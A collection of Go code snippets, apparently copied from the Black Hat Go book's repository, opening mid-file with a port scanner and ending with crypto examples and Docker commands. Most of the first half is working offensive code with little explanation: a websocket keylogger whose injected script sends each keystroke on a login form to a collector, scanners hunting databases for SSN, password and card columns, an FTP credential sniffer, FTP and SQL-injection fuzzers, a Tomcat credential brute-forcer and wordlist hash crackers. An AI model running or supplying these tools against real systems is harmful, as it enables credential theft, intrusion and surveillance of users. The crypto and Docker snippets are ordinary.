    results <- p
  }
}

func main() {
  ports := make(chan int, 100)
  results := make(chan int)
  var openports []int

  for i := 0; i < cap(ports); i++ {
    go worker(ports, results)
  }

  go func() {
    for i := 1; i <= 1024; i++ {
      ports <- i
    }
  }()

  for i := 0; i < 1024; i++ {
    port := <-results
    if port != 0 {
      openports = append(openports, port)
    }
  }

  close(ports)
  close(results)
  sort.Ints(openports)
  for _, port := range openports {
    fmt.Printf("%d open\n", port)
  }
}
==================================================
Websocket keylogger
(tags: websocket keylogger)
---

https://github.com/blackhat-go

1. For example use a site jsbin.com
2. Insert there

<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<script src='http://localhost:8080/k.js'></script>
<form action='/login' method='post'><input name='username'/> <input name='password'/> <input type="submit"/></form>
</body>
</html>

3. In main.go write

package main

import (
  "flag"
  "fmt"
  "html/template"
  "log"
  "net/http"

  "github.com/gorilla/mux"
  "github.com/gorilla/websocket"
)

var (
  upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },
  }

  listenAddr string
  wsAddr     string
  jsTemplate *template.Template
)

func init() {
  flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
  flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
  flag.Parse()
  var err error
  jsTemplate, err = template.ParseFiles("logger.js")
  if err != nil {
    panic(err)
  }
}

func serveWS(w http.ResponseWriter, r *http.Request) {
  conn, err := upgrader.Upgrade(w, r, nil)
  if err != nil {
    http.Error(w, "", 500)
    return
  }
  defer conn.Close()
  fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
  for {
    _, msg, err := conn.ReadMessage()
    if err != nil {
      return
    }
    fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
  }
}

func serveFile(w http.ResponseWriter, r *http.Request) {
  w.Header().Set("Content-Type", "application/javascript")
  jsTemplate.Execute(w, wsAddr)
}

func main() {
  r := mux.NewRouter()
  r.HandleFunc("/ws", serveWS)
  r.HandleFunc("/k.js", serveFile)
  log.Fatal(http.ListenAndServe(":8080", r))
}

4. In logger.js write

(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();

// example of output in serever if someone tapping on the site
From 127.0.0.1:41488: d
From 127.0.0.1:41488: f
From 127.0.0.1:41488: g
==================================================
Database miner for mongo
(tags: db miner mongo schema)
---

https://github.com/blackhat-go

// dbminer.go
package main

import (
  "fmt"
  "regexp"
)

type DatabaseMiner interface {
  GetSchema() (*Schema, error)
}

type Schema struct {
  Databases []Database
}

type Database struct {
  Name   string
  Tables []Table
}

type Table struct {
  Name    string
  Columns []string
}

func Search(m DatabaseMiner) error {
  s, err := m.GetSchema()
  if err != nil {
    return err
  }
  re := getRegex()
  for _, database := range s.Databases {
    for _, table := range database.Tables {
      for _, field := range table.Columns {
        for _, r := range re {
          if r.MatchString(field) {
            fmt.Println(database)
            fmt.Printf("[+] HIT: %s\n", field)
          }
        }
      }
    }
  }
  return nil
}

func getRegex() []*regexp.Regexp {
  return []*regexp.Regexp{
    regexp.MustCompile(`(?i)social`),
    regexp.MustCompile(`(?i)ssn`),
    regexp.MustCompile(`(?i)pass(word)?`),
    regexp.MustCompile(`(?i)hash`),
    regexp.MustCompile(`(?i)ccnum`),
    regexp.MustCompile(`(?i)card`),
    regexp.MustCompile(`(?i)security`),
    regexp.MustCompile(`(?i)key`),
  }
}

func (s Schema) String() string {
  var ret string
  for _, database := range s.Databases {
    ret += fmt.Sprint(database.String() + "\n")
  }
  return ret
}

func (d Database) String() string {
  ret := fmt.Sprintf("[DB] = %+s\n", d.Name)
  for _, table := range d.Tables {
    ret += table.String()
  }
  return ret
}

func (t Table) String() string {
  ret := fmt.Sprintf("    [TABLE] = %+s\n", t.Name)
  for _, field := range t.Columns {
    ret += fmt.Sprintf("       [COL] = %+s\n", field)
  }
  return ret
}

// main.go
package main

import (
  "os"
  "gopkg.in/mgo.v2"
  "gopkg.in/mgo.v2/bson"
)

type MongoMiner struct {
  Host    string
  session *mgo.Session
}

func New(host string) (*MongoMiner, error) {
  m := MongoMiner{Host: host}
  err := m.connect()
  if err != nil {
    return nil, err
  }
  return &m, nil
}

func (m *MongoMiner) connect() error {
  s, err := mgo.Dial(m.Host)
  if err != nil {
    return err
  }
  m.session = s
  return nil
}

func (m *MongoMiner) GetSchema() (*dbminer.Schema, error) {
  var s = new(dbminer.Schema)

  dbnames, err := m.session.DatabaseNames()
  if err != nil {
    return nil, err
  }

  for _, dbname := range dbnames {
    db := dbminer.Database{Name: dbname, Tables: []dbminer.Table{}}
    collections, err := m.session.DB(dbname).CollectionNames()
    if err != nil {
      return nil, err
    }

    for _, collection := range collections {
      table := dbminer.Table{Name: collection, Columns: []string{}}

      var docRaw bson.Raw
      err := m.session.DB(dbname).C(collection).Find(nil).One(&docRaw)
      if err != nil {
        return nil, err
      }

      var doc bson.RawD
      if err := docRaw.Unmarshal(&doc); err != nil {
        if err != nil {
          return nil, err
        }
      }

      for _, f := range doc {
        table.Columns = append(table.Columns, f.Name)
      }
      db.Tables = append(db.Tables, table)
    }
    s.Databases = append(s.Databases, db)
  }
  return s, nil
}

func main() {
  mm, err := New(os.Args[1])
  if err != nil {
    panic(err)
  }
  if err := Search(mm); err != nil {
    panic(err)
  }
}
==================================================
Database miner for mysql
(tags: db miner mysql schema)
---

https://github.com/blackhat-go

// dbminer.go
package main

import (
  "fmt"
  "regexp"
)

type DatabaseMiner interface {
  GetSchema() (*Schema, error)
}

type Schema struct {
  Databases []Database
}

type Database struct {
  Name   string
  Tables []Table
}

type Table struct {
  Name    string
  Columns []string
}

func Search(m DatabaseMiner) error {
  s, err := m.GetSchema()
  if err != nil {
    return err
  }
  re := getRegex()
  for _, database := range s.Databases {
    for _, table := range database.Tables {
      for _, field := range table.Columns {
        for _, r := range re {
          if r.MatchString(field) {
            fmt.Println(database)
            fmt.Printf("[+] HIT: %s\n", field)
          }
        }
      }
    }
  }
  return nil
}

func getRegex() []*regexp.Regexp {
  return []*regexp.Regexp{
    regexp.MustCompile(`(?i)social`),
    regexp.MustCompile(`(?i)ssn`),
    regexp.MustCompile(`(?i)pass(word)?`),
    regexp.MustCompile(`(?i)hash`),
    regexp.MustCompile(`(?i)ccnum`),
    regexp.MustCompile(`(?i)card`),
    regexp.MustCompile(`(?i)security`),
    regexp.MustCompile(`(?i)key`),
  }
}

func (s Schema) String() string {
  var ret string
  for _, database := range s.Databases {
    ret += fmt.Sprint(database.String() + "\n")
  }
  return ret
}

func (d Database) String() string {
  ret := fmt.Sprintf("[DB] = %+s\n", d.Name)
  for _, table := range d.Tables {
    ret += table.String()
  }
  return ret
}

func (t Table) String() string {
  ret := fmt.Sprintf("    [TABLE] = %+s\n", t.Name)
  for _, field := range t.Columns {
    ret += fmt.Sprintf("       [COL] = %+s\n", field)
  }
  return ret
}

// main.go
package main

import (
  "database/sql"
  "fmt"
  "log"
  "os"

  _ "github.com/go-sql-driver/mysql"
  "github.com/blackhat-go/bhg/ch-7/db/dbminer"
)

type MySQLMiner struct {
  Host string
  Db   sql.DB
}

func New(host string) (*MySQLMiner, error) {
  m := MySQLMiner{Host: host}
  err := m.connect()
  if err != nil {
    return nil, err
  }
  return &m, nil
}

func (m *MySQLMiner) connect() error {

  db, err := sql.Open("mysql", fmt.Sprintf("root:password@tcp(%s:3306)/information_schema", m.Host))
  if err != nil {
    log.Panicln(err)
  }
  m.Db = *db
  return nil
}

func (m *MySQLMiner) GetSchema() (*dbminer.Schema, error) {
  var s = new(dbminer.Schema)

  sql := `SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns
  WHERE TABLE_SCHEMA NOT IN ('mysql', 'information_schema', 'performance_schema', 'sys')
  ORDER BY TABLE_SCHEMA, TABLE_NAME`
  schemarows, err := m.Db.Query(sql)
  if err != nil {
    return nil, err
  }
  defer schemarows.Close()

  var prevschema, prevtable string
  var db dbminer.Database
  var table dbminer.Table
  for schemarows.Next() {
    var currschema, currtable, currcol string
    if err := schemarows.Scan(&currschema, &currtable, &currcol); err != nil {
      return nil, err
    }

    if currschema != prevschema {
      if prevschema != "" {
        db.Tables = append(db.Tables, table)
        s.Databases = append(s.Databases, db)
      }
      db = dbminer.Database{Name: currschema, Tables: []dbminer.Table{}}
      prevschema = currschema
      prevtable = ""
    }

    if currtable != prevtable {
      if prevtable != "" {
        db.Tables = append(db.Tables, table)
      }
      table = dbminer.Table{Name: currtable, Columns: []string{}}
      prevtable = currtable
    }
    table.Columns = append(table.Columns, currcol)
  }
  db.Tables = append(db.Tables, table)
  s.Databases = append(s.Databases, db)
  if err := schemarows.Err(); err != nil {
    return nil, err
  }

  return s, nil
}

func main() {
  mm, err := New(os.Args[1])
  if err != nil {
    panic(err)
  }
  defer mm.Db.Close()
  if err := dbminer.Search(mm); err != nil {
    panic(err)
  }
}
==================================================
Using pcap for finding all devices
(tags: pcap device find)
---

https://github.com/blackhat-go

// sudo apt install libpcap-dev

package main

import (
  "fmt"
  "log"
  "github.com/google/gopacket/pcap"
)

func main() {
  devices, err := pcap.FindAllDevs()
  if err != nil {
    log.Panicln(err)
  }

  for _, device := range devices {
    fmt.Println(device.Name)
    for _, address := range device.Addresses {
      fmt.Printf("    IP:      %s\n", address.IP)
      fmt.Printf("    Netmask: %s\n", address.Netmask)
    }
  }
}
==================================================
Capturing packets and filter them
(tags: pcap packet filter)
---

https://github.com/blackhat-go

package main

import (
  "fmt"
  "log"
  "github.com/google/gopacket"
  "github.com/google/gopacket/pcap"
)

var (
  iface    = "enp0s5"
  snaplen  = int32(1600)
  promisc  = false
  timeout  = pcap.BlockForever
  filter   = "tcp and port 80"
  devFound = false
)

func main() {
  devices, err := pcap.FindAllDevs()
  if err != nil {
    log.Panicln(err)
  }

  for _, device := range devices {
    if device.Name == iface {
      devFound = true
    }
  }
  if !devFound {
    log.Panicf("Device named '%s' does not exist\n", iface)
  }

  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
  if err != nil {
    log.Panicln(err)
  }
  defer handle.Close()

  if err := handle.SetBPFFilter(filter); err != nil {
    log.Panicln(err)
  }

  source := gopacket.NewPacketSource(handle, handle.LinkType())
  for packet := range source.Packets() {
    fmt.Println(packet)
  }
}
==================================================
Inspect payload from ftp packets using pcap
(tags: pcap packet ftp payload)
---

https://github.com/blackhat-go

package main

import (
  "bytes"
  "fmt"
  "log"
  "github.com/google/gopacket"
  "github.com/google/gopacket/pcap"
)

var (
  iface    = "enp0s5"
  snaplen  = int32(1600)
  promisc  = false
  timeout  = pcap.BlockForever
  filter   = "tcp and dst port 21"
  devFound = false
)

func main() {
  devices, err := pcap.FindAllDevs()
  if err != nil {
    log.Panicln(err)
  }

  for _, device := range devices {
    if device.Name == iface {
      devFound = true
    }
  }
  if !devFound {
    log.Panicf("Device named '%s' does not exist\n", iface)
  }

  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
  if err != nil {
    log.Panicln(err)
  }
  defer handle.Close()

  if err := handle.SetBPFFilter(filter); err != nil {
    log.Panicln(err)
  }

  source := gopacket.NewPacketSource(handle, handle.LinkType())
  for packet := range source.Packets() {
    appLayer := packet.ApplicationLayer()
    if appLayer == nil {
      continue
    }
    payload := appLayer.Payload()
    if bytes.Contains(payload, []byte("USER")) {
      fmt.Print(string(payload))
    } else if bytes.Contains(payload, []byte("PASS")) {
      fmt.Print(string(payload))
    }
  }
}
==================================================
Ftp fuzzer
(tags: ftp fuzzer)
---

https://github.com/blackhat-go

package main

import (
  "bufio"
  "fmt"
  "log"
  "net"
)

func main() {
  for i := 0; i < 2500; i++ {
    conn, err := net.Dial("tcp", "10.0.1.20:21")
    if err != nil {
      log.Fatalf("[!] Error at offset %d: %s\n", i, err)
    }
    bufio.NewReader(conn).ReadString('\n')

    user := ""
    for n := 0; n <= i; n++ {
      user += "A"
    }

    raw := "USER %s\n"
    fmt.Fprintf(conn, raw, user)
    bufio.NewReader(conn).ReadString('\n')

    raw = "PASS password\n"
    fmt.Fprint(conn, raw)
    bufio.NewReader(conn).ReadString('\n')

    if err := conn.Close(); err != nil {
      log.Println("[!] Unable to close connection. Is service alive?")
    }
  }
}
==================================================
Http sql fuzzer
(tags: http sql fuzzer)
---

https://github.com/blackhat-go

package main

import (
  "bytes"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
  "regexp"
)

func main() {
  payloads := []string{
    "baseline",
    ")",
    "(",
    "\"",
    "'",
  }

  sqlErrors := []string{
    "SQL",
    "MySQL",
    "ORA-",
    "syntax",
  }

  errRegexes := []*regexp.Regexp{}
  for _, e := range sqlErrors {
    re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e))
    errRegexes = append(errRegexes, re)
  }

  for _, payload := range payloads {
    client := new(http.Client)
    body := []byte(fmt.Sprintf("username=%s&password=p", payload))
    req, err := http.NewRequest(
      "POST",
      "http://10.0.1.20:8080/WebApplication/login.jsp?debug=true",
      bytes.NewReader(body),
    )
    if err != nil {
      log.Fatalf("[!] Unable to generate request: %s\n", err)
    }
    req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
    resp, err := client.Do(req)
    if err != nil {
      log.Fatalf("[!] Unable to process response: %s\n", err)
    }
    body, err = ioutil.ReadAll(resp.Body)
    if err != nil {
      log.Fatalf("[!] Unable to read response body: %s\n", err)
    }
    resp.Body.Close()

    for idx, re := range errRegexes {
      if re.MatchString(string(body)) {
        fmt.Printf(
          "[+] SQL Error found ('%s') for payload: %s\n",
          sqlErrors[idx],
          payload,
        )
        break
      }
    }
  }
}
==================================================
Plugin on lua for go
(tags: plugin lua)
---

https://github.com/blackhat-go

// plugins/tomcat.lua
usernames = {"admin", "manager", "tomcat"}
passwords = {"admin", "manager", "tomcat", "password"}

status, basic, err = http.head("10.0.1.20", 8080, "/manager/html")
if err ~= "" then
    print("[!] Error: "..err)
    return
end
if status ~= 401 or not basic then
    print("[!] Error: Endpoint does not require Basic Auth. Exiting.")
    return
end
print("[+] Endpoint requires Basic Auth. Proceeding with password guessing")
for i, username in ipairs(usernames) do
    for j, password in ipairs(passwords) do
        status, basic, err = http.get("10.0.1.20", 8080, username, password, "/manager/html")
        if status == 200 then
            print("[+] Found creds - "..username..":"..password)
            return
        end
    end
end

// cmd/scanner/main.go
package main

import (
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
  "os"

  lua "github.com/yuin/gopher-lua"
)

const (
  LuaHttpTypeName = "http"
  PluginsDir      = "../../plugins"
)

func register(l *lua.LState) {
  mt := l.NewTypeMetatable(LuaHttpTypeName)
  l.SetGlobal("http", mt)
  // static attributes
  l.SetField(mt, "head", l.NewFunction(head))
  l.SetField(mt, "get", l.NewFunction(get))
}

func head(l *lua.LState) int {
  var (
    host string
    port uint64
    path string
    resp *http.Response
    err  error
    url  string
  )
  host = l.CheckString(1)
  port = uint64(l.CheckInt64(2))
  path = l.CheckString(3)
  url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
  if resp, err = http.Head(url); err != nil {
    l.Push(lua.LNumber(0))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(fmt.Sprintf("Request failed: %s", err)))
    return 3
  }
  l.Push(lua.LNumber(resp.StatusCode))
  l.Push(lua.LBool(resp.Header.Get("WWW-Authenticate") != ""))
  l.Push(lua.LString(""))
  return 3
}

func get(l *lua.LState) int {
  var (
    host     string
    port     uint64
    username string
    password string
    path     string
    resp     *http.Response
    err      error
    url      string
    client   *http.Client
    req      *http.Request
  )
  host = l.CheckString(1)
  port = uint64(l.CheckInt64(2))
  username = l.CheckString(3)
  password = l.CheckString(4)
  path = l.CheckString(5)
  url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
  client = new(http.Client)
  if req, err = http.NewRequest("GET", url, nil); err != nil {
    l.Push(lua.LNumber(0))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(fmt.Sprintf("Unable to build GET request: %s", err)))
    return 3
  }
  if username != "" || password != "" {
    // Assume Basic Auth is required since user and/or password is set
    req.SetBasicAuth(username, password)
  }
  if resp, err = client.Do(req); err != nil {
    l.Push(lua.LNumber(0))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(fmt.Sprintf("Unable to send GET request: %s", err)))
    return 3
  }
  l.Push(lua.LNumber(resp.StatusCode))
  l.Push(lua.LBool(false))
  l.Push(lua.LString(""))
  return 3
}

func main() {
  var (
    l     *lua.LState
    files []os.FileInfo
    err   error
    f     string
  )
  l = lua.NewState()
  defer l.Close()
  register(l)
  if files, err = ioutil.ReadDir(PluginsDir); err != nil {
    log.Fatalln(err)
  }

  for idx := range files {
    fmt.Println("Found plugin: " + files[idx].Name())
    f = fmt.Sprintf("%s/%s", PluginsDir, files[idx].Name())
    if err := l.DoFile(f); err != nil {
      log.Fatalln(err)
    }
  }
}
==================================================
Plugin
(tags: plugin)
---

// plugins/plugin_name.go
// go build -buildmode=plugin
package main

import "fmt"

var V int

func F() { fmt.Printf("Hello, number %d\n", V) }

// main.go
p, err := plugin.Open("plugin_name.so")
v, err := p.Lookup("V")
f, err := p.Lookup("F")

*v.(*int) = 7
f.(func())() // prints "Hello, number 7"
==================================================
Crypto aes
(tags: crypto aes)
---

https://github.com/blackhat-go

package main

import (
  "bytes"
  "crypto/aes"
  "crypto/cipher"
  "crypto/rand"
  "errors"
  "fmt"
  "io"
  "log"
)

func pad(buf []byte) []byte {
  // Assumes valid lengths. Should add additional checks.
  length := len(buf)
  padding := aes.BlockSize - (length % aes.BlockSize)
  if padding == 0 {
    padding = aes.BlockSize
  }
  padded := make([]byte, length+padding)
  copy(padded, buf)
  copy(padded[length:], bytes.Repeat([]byte{byte(padding)}, padding))
  return padded
}

func unpad(buf []byte) []byte {
  // Assume valid length and padding. Should add checks
  padding := int(buf[len(buf)-1])
  return buf[:len(buf)-padding]
}

func encrypt(plaintext, key []byte) ([]byte, error) {
  var (
    ciphertext []byte
    iv         []byte
    block      cipher.Block
    mode       cipher.BlockMode
    err        error
  )

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  iv = make([]byte, aes.BlockSize)
  if _, err = io.ReadFull(rand.Reader, iv); err != nil {
    log.Fatalln(err)
  }

  mode = cipher.NewCBCEncrypter(block, iv)

  plaintext = pad(plaintext)
  ciphertext = make([]byte, aes.BlockSize+len(plaintext))
  copy(ciphertext, iv)
  mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

  return ciphertext, nil
}

func decrypt(ciphertext, key []byte) ([]byte, error) {
  var (
    plaintext []byte
    iv        []byte
    block     cipher.Block
    mode      cipher.BlockMode
    err       error
  )

  if len(ciphertext) < aes.BlockSize {
    return nil, errors.New("Invalid ciphertext length: too short")
  }

  if len(ciphertext)%aes.BlockSize != 0 {
    return nil, errors.New("Invalid ciphertext length: not a multiple of blocksize")
  }

  iv = ciphertext[:aes.BlockSize]
  ciphertext = ciphertext[aes.BlockSize:]

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  mode = cipher.NewCBCDecrypter(block, iv)
  plaintext = make([]byte, len(ciphertext))
  mode.CryptBlocks(plaintext, ciphertext)
  plaintext = unpad(plaintext)

  return plaintext, nil
}

func main() {
  var (
    err        error
    plaintext  []byte
    ciphertext []byte
    key        []byte
  )

  key = make([]byte, 32)
  if _, err = io.ReadFull(rand.Reader, key); err != nil {
    log.Fatalln(err)
  }

  plaintext = []byte("4321123456789090")
  if ciphertext, err = encrypt(plaintext, key); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("key        = %x\n", key)
  fmt.Printf("ciphertext = %x\n", ciphertext)

  if plaintext, err = decrypt(ciphertext, key); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("plaintext  = %s\n", plaintext)
}
==================================================
Crypto bcrypt
(tags: crypto bcrypt)
---

https://github.com/blackhat-go

package main

import (
  "log"
  "os"

  "golang.org/x/crypto/bcrypt"
)

var storedHash = "$2a$10$Zs3ZwsjV/nF.KuvSUE.5WuwtDrK6UVXcBpQrH84V8q3Opg1yNdWLu"

func main() {
  // someC0mpl3xP@ssw0rd
  var password string
  if len(os.Args) != 2 {
    log.Fatalln("Usage: bcrypt password")
  }
  password = os.Args[1]

  hash, err := bcrypt.GenerateFromPassword(
    []byte(password),
    bcrypt.DefaultCost,
  )
  if err != nil {
    log.Fatalln(err)
  }
  log.Printf("hash = %s\n", hash)

  err = bcrypt.CompareHashAndPassword([]byte(storedHash), []byte(password))
  if err != nil {
    log.Println("[!] Authentication failed")
    return
  }
  log.Println("[+] Authentication successful")
}
==================================================
Crypto gcm
(tags: crypto gcm)
---

https://github.com/blackhat-go

package main

import (
  "crypto/aes"
  "crypto/cipher"
  "crypto/rand"
  "errors"
  "fmt"
  "io"
  "log"
)

var key = make([]byte, 32)

func encrypt(plaintext []byte) ([]byte, error) {
  var (
    ciphertext []byte
    nonce      []byte
    block      cipher.Block
    aead       cipher.AEAD
    err        error
  )

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  if aead, err = cipher.NewGCM(block); err != nil {
    return nil, err
  }

  nonce = make([]byte, aead.NonceSize())
  if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
    log.Fatalln(err)
  }

  ciphertext = aead.Seal(nil, nonce, plaintext, nil)

  ciphertext = append(nonce, ciphertext...)
  return ciphertext, nil
}

func decrypt(ciphertext []byte) ([]byte, error) {
  var (
    plaintext []byte
    nonce     []byte
    block     cipher.Block
    aead      cipher.AEAD
    err       error
  )

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  if aead, err = cipher.NewGCM(block); err != nil {
    return nil, err
  }

  nonceSize := aead.NonceSize()
  if len(ciphertext) < nonceSize {
    return nil, errors.New("Invalid ciphertext length")
  }
  nonce = ciphertext[:nonceSize]
  ciphertext = ciphertext[nonceSize:]

  if plaintext, err = aead.Open(nil, nonce, ciphertext, nil); err != nil {
    return nil, err
  }

  return plaintext, nil
}

func main() {
  var (
    err        error
    plaintext  []byte
    ciphertext []byte
  )

  if _, err = io.ReadFull(rand.Reader, key); err != nil {
    log.Fatalln(err)
  }

  plaintext = []byte("privet")
  if ciphertext, err = encrypt(plaintext); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("ciphertext = %x\n", ciphertext)

  if plaintext, err = decrypt(ciphertext); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("plaintext = %s\n", plaintext)
}
==================================================
Crypto md5 hash
(tags: crypto md5 hash)
---

https://github.com/blackhat-go

// wordlist.txt
password
Password
Nickelback4life
Summer2017

// main.go
package main

import (
  "bufio"
  "crypto/md5"
  "fmt"
  "log"
  "os"
)

var md5hash = "77f62e3524cd583d698d51fa24fdff4f"

func main() {
  f, err := os.Open("wordlist.txt")
  if err != nil {
    log.Fatalln(err)
  }
  defer f.Close()

  scanner := bufio.NewScanner(f)
  for scanner.Scan() {
    password := scanner.Text()
    hash := fmt.Sprintf("%x", md5.Sum([]byte(password)))
    if hash == md5hash {
      fmt.Printf("[+] Password found (MD5): %s\n", password)
    }
  }

  if err := scanner.Err(); err != nil {
    log.Fatalln(err)
  }
}
==================================================
Crypto sha256 hash
(tags: crypto sha256 hash)
---

https://github.com/blackhat-go

// wordlist.txt
password
Password
Nickelback4life
Summer2017

// main.go
package main

import (
  "bufio"
  "crypto/sha256"
  "fmt"
  "log"
  "os"
)

var sha256hash = "95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4ced"

func main() {
  f, err := os.Open("wordlist.txt")
  if err != nil {
    log.Fatalln(err)
  }
  defer f.Close()

  scanner := bufio.NewScanner(f)
  for scanner.Scan() {
    password := scanner.Text()
    hash := fmt.Sprintf("%x", sha256.Sum256([]byte(password)))
    if hash == sha256hash {
      fmt.Printf("[+] Password found (SHA-256): %s\n", password)
    }
  }

  if err := scanner.Err(); err != nil {
    log.Fatalln(err)
  }
}
==================================================
Crypto hmac
(tags: crypto hmac)
---

https://github.com/blackhat-go

package main

import (
  "crypto/hmac"
  "crypto/sha256"
  "encoding/hex"
  "fmt"
)

var key = []byte("some random key")

func checkMAC(message, recvMAC []byte) bool {
  mac := hmac.New(sha256.New, key)
  mac.Write(message)
  calcMAC := mac.Sum(nil)

  return hmac.Equal(calcMAC, recvMAC)
}

func main() {
  // In real implementations, we’d read the message and HMAC value from network source
  message := []byte("The red eagle flies at 10:00")
  mac, _ := hex.DecodeString("69d2c7b6fbbfcaeb72a3172f4662601d1f16acfb46339639ac8c10c8da64631d")
  if checkMAC(message, mac) {
    fmt.Println("EQUAL")
  } else {
    fmt.Println("NOT EQUAL")
  }
}
==================================================
Crypto cert tls
(tags: crypto cert tls)
---

https://github.com/blackhat-go

// cert for server
// openssl req -nodes -x509 -newkey rsa:4096 -keyout serverKey.pem -out serverCrt.pem -days 365
// Country Name (2 letter code) [AU]:
// State or Province Name (full name) [Some-State]:
// Locality Name (eg, city) []:
// Organization Name (eg, company) [Internet Widgits Pty Ltd]:
// Organizational Unit Name (eg, section) []:
// Common Name (e.g. server FQDN or YOUR name) []:localhost
// Email Address []:

// cert for client
// openssl req -nodes -x509 -newkey rsa:4096 -keyout clientKey.pem -out clientCrt.pem -days 365
// Country Name (2 letter code) [AU]:
// State or Province Name (full name) [Some-State]:
// Locality Name (eg, city) []:
// Organization Name (eg, company) [Internet Widgits Pty Ltd]:
// Organizational Unit Name (eg, section) []:
// Common Name (e.g. server FQDN or YOUR name) []:Tom
// Email Address []:

// set enviroment for build go GODEBUG=x509ignoreCN=0

// curl -ik -X GET --cert clientCrt.pem --key clientKey.pem https://localhost:9443/hello

// cmd/client/main.go
package main

import (
  "crypto/tls"
  "crypto/x509"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
)

func main() {
  var (
    err              error
    cert             tls.Certificate
    serverCert, body []byte
    pool             *x509.CertPool
    tlsConf          *tls.Config
    transport        *http.Transport
    client           *http.Client
    resp             *http.Response
  )

  if cert, err = tls.LoadX509KeyPair("clientCrt.pem", "clientKey.pem"); err != nil {
    log.Fatalln(err)
  }

  if serverCert, err = ioutil.ReadFile("../server/serverCrt.pem"); err != nil {
    log.Fatalln(err)
  }

  pool = x509.NewCertPool()
  pool.AppendCertsFromPEM(serverCert)

  tlsConf = &tls.Config{
    Certificates: []tls.Certificate{cert},
    RootCAs:      pool,
  }
  tlsConf.BuildNameToCertificate()

  transport = &http.Transport{
    TLSClientConfig: tlsConf,
  }
  client = &http.Client{
    Transport: transport,
  }

  if resp, err = client.Get("https://server.blackhat-go.local:9443/hello"); err != nil {
    log.Fatalln(err)
  }
  if body, err = ioutil.ReadAll(resp.Body); err != nil {
    log.Fatalln(err)
  }
  defer resp.Body.Close()

  fmt.Printf("Success: %s\n", body)
}

// cmd/server/main.go
package main

import (
  "crypto/tls"
  "crypto/x509"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
)

func helloHandler(w http.ResponseWriter, r *http.Request) {
  fmt.Printf("Hello: %s\n", r.TLS.PeerCertificates[0].Subject.CommonName)
  fmt.Fprint(w, "Authentication successful")
}

func main() {
  var (
    err        error
    clientCert []byte
    pool       *x509.CertPool
    tlsConf    *tls.Config
    server     *http.Server
  )

  http.HandleFunc("/hello", helloHandler)

  if clientCert, err = ioutil.ReadFile("../client/clientCrt.pem"); err != nil {
    log.Fatalln(err)
  }
  pool = x509.NewCertPool()
  pool.AppendCertsFromPEM(clientCert)

  tlsConf = &tls.Config{
    ClientCAs:  pool,
    ClientAuth: tls.RequireAndVerifyClientCert,
  }
  tlsConf.BuildNameToCertificate()

  server = &http.Server{
    Addr:      ":9443",
    TLSConfig: tlsConf,
  }
  log.Fatalln(server.ListenAndServeTLS("serverCrt.pem", "serverKey.pem"))
}
==================================================
Sign message and veryfy signature
(tags: crypto sign message verify)
---

https://github.com/blackhat-go

package main

import (
  "crypto"
  "crypto/rand"
  "crypto/rsa"
  "crypto/sha256"
  "fmt"
  "log"
)

func main() {
  var (
    err                                              error
    privateKey                                       *rsa.PrivateKey
    publicKey                                        *rsa.PublicKey
    message, plaintext, ciphertext, signature, label []byte
  )

  if privateKey, err = rsa.GenerateKey(rand.Reader, 2048); err != nil {
    log.Fatalln(err)
  }
  publicKey = &privateKey.PublicKey

  label = []byte("")
  message = []byte("Some super secret message, maybe a session key even")
  ciphertext, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, message, label)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("Ciphertext: %x\n", ciphertext)

  plaintext, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, ciphertext, label)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("Plaintext: %s\n", plaintext)

  h := sha256.New()
  h.Write(message)
  signature, err = rsa.SignPSS(rand.Reader, privateKey, crypto.SHA256, h.Sum(nil), nil)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("Signature: %x\n", signature)

  err = rsa.VerifyPSS(publicKey, crypto.SHA256, h.Sum(nil), signature, nil)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Println("Signature verified")
}
==================================================
Remove all images in docker
(tags: remove image docker)
---

docker container stop $(docker container ls -aq)
docker container prune -f
docker rmi -f $(docker images -a -q)
==================================================
Write ubuntu on usb flash
(tags: ubuntu usb)
---

1. Download ubuntu from ubuntu.com
2. Download the program Universal-USB-Installer-1.9.9.3.exe
3. Format the usb-flash in fat32
4. In installer chose the mode fat32
5. With program HxD fixed the bytes of the boot sector of the usb-flash accordind the article https://habr.com/ru/post/128004/
6. In Sector 0 at the end, assign the first byte 80h to the link
==================================================
Docker enter into container
(tags: docker enter container)
---

docker ps
docker exec -it mycontainer sh
// docker exec -it re583725uh bash
printenv
==================================================
Docker-compose enter into container
